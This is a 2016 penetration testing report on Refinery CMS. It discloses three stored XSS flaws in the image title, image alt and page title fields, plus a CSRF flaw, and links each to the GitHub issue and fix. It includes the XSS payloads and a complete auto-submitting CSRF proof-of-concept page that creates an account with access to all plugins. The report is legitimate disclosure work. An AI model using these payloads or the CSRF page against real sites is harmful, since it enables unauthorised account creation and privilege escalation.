 1 | p a g e penetration testing report for refinery cms shravan kumar budharap (info-sec researcher & consultant) securelayer7 shravan.kumar@securelayer7.net www.securelayer7.net 2 | p a g e table of contents introduction ............................................................................................................................................ 1 identified vulnerabilities.........................................................................................................................4 pt-rcms-001: stored xss in the title text in the image upload ...........................................................4 pt-rcms-002: stored xss in the alt text in the image upload ............................................................7 pt-rcms-003: stored xss in the title of the add new page......................................................................9 pt-rcms-004: cross site request forgery on multiple events......................................................................11 3 | p a g e introduction refinery cms, often shortened to refinery, is an open source content management system written in ruby as a ruby on rails web application with jquery used as the javascript library. refinery cms supports rails 3.2and rails 4.2 .refinery differs from similar products by targeting a non-technical end user and allowing the developer to create a flexible website rapidly by staying as close as possible to the conventions of the ruby on rails framework. the penetration test against several parts of therefinery cms took an overall of 3 working days from 4th feb 2016 to 6th feb 2016. the testing was performed on the refinerycms-e731bca7360a bundle. all the vulnerabilities found during testing may affect all the version prior to this bundle. note: all security issues identified and discussed in this docum ent were addressed to the refinery cms development team between 4th feb 2016 and 6th feb 2016. all deployed fixes were reviewedand verified by me. 4 | p a g e identified vulnerabilities the following sections list both vulnerabilities and implementation issues spotted during the testing period. note that findings are listed in a chronological order rather than by their degree of severity and impact. the aforementioned severity rank is simply given i n brackets following the title heading for each vulnerability. each vulnerability is additionally given a unique ident ifier (e.g. pt-rcms-xxx) for the purpose of facilitating any future follow-up correspondence. pt-rcms-001: stored xss in the title text in the image upload (medium) it seems that the display engine i.e. wysiwyg used in the refinery cms is not properly sanitizing the html entities before displaying them on the page. this issue is addressed in the github. https://github.com/refinery/refinerycms/issues/3097 the commit link which fixed the issue. https://github.com/refinery/refinerycms/commit/ed05cf9ccb4cb1603e62d99b40af097993fba4e4 the steps to produce the vulnerability are 1. log in the refinery cms. 2. go to image tabs. 3. click on add new image. 4. select an image to upload. 5. in the title box insert the xss payload. 6. write anything in the alt box. 7. click on save button. 8. move mouse pointer over the info icon found below the uploaded image. 9. we can see that the xss payload gets executed. the xss payload used '<marquee onscroll=confirm(1)>xss' 5 | p a g e the below image shows the vulnerable fields. these images shows the payload and the xss in action. 6 | p a g e the xss payload being executed. 7 | p a g e pt-rcms-002: stored xss in the alt text in the image upload (medium) this vulnerability is same as pt-rcms-001 but in a different location. this issue is addressed in the github https://github.com/refinery/refinerycms/issues/3097 the commit link which fixed the issue. https://github.com/refinery/refinerycms/commit/ed05cf9ccb4cb1603e62d99b40af097993fba4e4 the steps to produce the vulnerability are 1. log in the refinery cms. 2. go to image tabs. 3. click on add new image. 4. select an image to upload. 5. write anything in the title box. 6. in the alt box insert the xss payload. 7. click on save button. 8. move mouse pointer over the info icon found below the uploaded image. 9. we can see that the xss payload gets executed. the xss payload used '<marquee onscroll=confirm(2)>xss' the below image shows the payload. 8 | p a g e the below image shows the execution of xss payload 9 | p a g e pt-rcms-003: stored xss in the title of the add new page (medium) this issue is addressed in the github. https://github.com/refinery/refinerycms/issues/3097 the steps to produce the vulnerability are 1. log in the refinery cms. 2. go to pages tabs. 3. click on add new page. 4. insert the xss payload in the title box. 5. write anything in the body. 6. click on save button. 7. open the saved pages in the new browser window and we can see that the xss payload gets executed. the xss payload used <img src=x onerror=confirm(2)/> the xss vulnerable field is shown in below image. the below image shows the payload. 10 | p a g e the below image shows the payload in action. 11 | p a g e pt-rcms-004: cross site request forgery on multiple events. during testing i found that the anti csrf token used in the form field is not verified properly to process the forms. the forms are processed even though the authenticity_token is left blank this resulted in the csrf vulnerability. this issue was addressed in github. https://github.com/refinery/refinerycms/issues/3098 this is the link to the commit which fixed the issues. https://github.com/refinery/refinerycms/commit/9fd5a8b5e98827431add4a4c997286f10092cb9c the proof of concept poc.html is <html> <!-- csrf poc - add new account --> <body> <form name="csrf" id="csrf" action="http://localhost:3000/refinery/users" method="patch"> <!-- change the action value according to the server--> <input type="hidden" name="utf8" value="a&#156;&#147;" /> <input type="hidden" name="authenticity&#95;token" value="" /> <input type="hidden" name="user&#91;username&#93;" value="csrf" /> <input type="hidden" name="user&#91;full&#95;name&#93;" value="csrf" /> <input type="hidden" name="user&#91;email&#93;" value="csrf&#64;csrf&#46;com" /> <input type="hidden" name="user&#91;password&#93;" value="csrf" /> <input type="hidden" name="user&#91;password&#95;confirmation&#93;" value="csrf" /> <input type="hidden" name="user&#91;plugins&#93;&#91;&#93;" value="refinery&#95;files" /> <input type="hidden" name="user&#91;plugins&#93;&#91;&#93;" value="refinery&#95;images" /> <input type="hidden" name="user&#91;plugins&#93;&#91;&#93;" value="refinery&#95;pages" /> <input type="hidden" name="user&#91;plugins&#93;&#91;&#93;" value="refinery&#95;authentication&#95;devise" /> <input type="submit" value="submit form" /> </form> <script>document.getelementbyid("csrf").submit();</script> </body> </html> when a logged in administrator opens the poc.html a new user (csrf) is created with permission to access all plugins. this exploit can be used by least privilege users to elevate to the administrator level or for deletion of an existing user, creation of new user with full permissions to access all the plugins. 12 | p a g e